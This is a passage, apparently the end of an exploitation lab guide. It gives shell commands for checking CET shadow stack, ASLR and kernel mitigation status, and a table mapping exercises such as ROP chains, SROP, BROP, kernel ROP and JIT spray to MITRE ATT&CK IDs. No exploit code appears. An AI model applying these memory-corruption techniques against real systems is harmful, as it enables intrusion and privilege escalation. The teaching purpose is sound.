# Check CET status
cat /proc/self/status | grep -i shadow
dmesg | grep -i "cet\|ibt\|shadow"

# Check ASLR
cat /proc/sys/kernel/randomize_va_space  # 2 = full

# Check kernel mitigations
cat /sys/devices/system/cpu/vulnerabilities/*
```

## Appendix C: MITRE ATT&CK Mapping

| Lab Exercise | Technique | MITRE ID |
|-------------|-----------|----------|
| ROP chain execution | Exploitation for Client Execution | T1203 |
| Stack pivot | Process Injection | T1055 |
| SROP execve | Command and Scripting Interpreter | T1059.004 |
| BROP brute-force | Exploitation of Remote Services | T1210 |
| ret2dlresolve | Exploitation for Client Execution | T1203 |
| Kernel ROP | Exploitation for Privilege Escalation | T1068 |
| Gadget tool execution | Develop Capabilities: Exploits | T1587.004 |
| JIT spray | Exploitation for Client Execution | T1203 |
| DOP | Data Manipulation | T1565 |
